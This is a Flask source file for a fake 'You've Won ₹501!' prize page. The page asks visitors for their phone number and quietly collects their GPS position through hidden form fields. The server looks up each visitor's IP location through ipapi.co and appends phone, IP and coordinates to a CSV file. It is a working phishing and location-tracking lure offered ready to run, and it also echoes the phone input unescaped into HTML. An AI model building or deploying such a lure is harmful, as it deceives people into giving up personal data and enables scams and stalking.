# app.py
from flask import Flask, request, render_template_string
import requests
import csv
import os
from datetime import datetime

app = Flask(__name__)

HTML_PAGE = """
<!doctype html>
<html lang="en">
<head>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <meta charset="utf-8">
  <title>Win ₹501</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; background: #f9f9f9; text-align:center;}
    .container { background: white; padding: 20px; border-radius: 8px; max-width: 400px; margin: auto; box-shadow:0 2px 6px rgba(0,0,0,0.1);}
    h1 { color: green; }
    input, button { padding: 10px; width: 100%; margin: 5px 0; border-radius: 4px; border: 1px solid #ccc; }
    button { background: green; color: white; border: none; font-weight: bold; cursor: pointer;}
    button:hover { background: darkgreen; }
  </style>
</head>
<body>
  <div class="container">
    <h1>🎉 You’ve Won ₹501!</h1>
    <p>Enter your phone number to claim your prize.</p>
    <form id="claimForm">
      <input type="tel" name="phone" id="phone" placeholder="Enter phone number" required>
      <input type="hidden" name="latitude" id="latitude">
      <input type="hidden" name="longitude" id="longitude">
      <button type="submit">Claim Now</button>
    </form>
  </div>

  <script>
    // Ask for GPS location
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        function(pos) {
          document.getElementById("latitude").value = pos.coords.latitude;
          document.getElementById("longitude").value = pos.coords.longitude;
        },
        function(err) {
          console.warn("GPS access denied or unavailable.");
        }
      );
    }

    // Handle form submit
    document.getElementById("claimForm").addEventListener("submit", function(e) {
      e.preventDefault();
      fetch("/", {
        method: "POST",
        body: new FormData(document.getElementById("claimForm"))
      }).then(res => res.text()).then(data => {
        document.body.innerHTML = data;
      });
    });
  </script>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        phone = request.form.get("phone")
        lat = request.form.get("latitude")
        lon = request.form.get("longitude")
        visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

        # IP-based location
        try:
            geo_req = requests.get(f"https://ipapi.co/{visitor_ip}/json/", timeout=5)
            geo_data = geo_req.json()
            ip_location = f"{geo_data.get('city', 'Unknown')}, {geo_data.get('country_name', 'Unknown')}"
        except Exception:
            ip_location = "Unknown"

        # Save to CSV
        file_exists = os.path.isfile("submissions.csv")
        with open("submissions.csv", mode="a", newline="") as file:
            writer = csv.writer(file)
            if not file_exists:
                writer.writerow(["Timestamp", "Phone", "IP", "IP_Location", "GPS_Lat", "GPS_Lon"])
            writer.writerow([datetime.now().isoformat(), phone, visitor_ip, ip_location, lat, lon])

        return f"""
        <h2>Thanks! 📞 {phone} recorded.</h2>
        <p>Your IP: {visitor_ip}<br>IP Location: {ip_location}</p>
        <p>GPS Lat: {lat or 'N/A'}, Lon: {lon or 'N/A'}</p>
        """

    return render_template_string(HTML_PAGE)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)






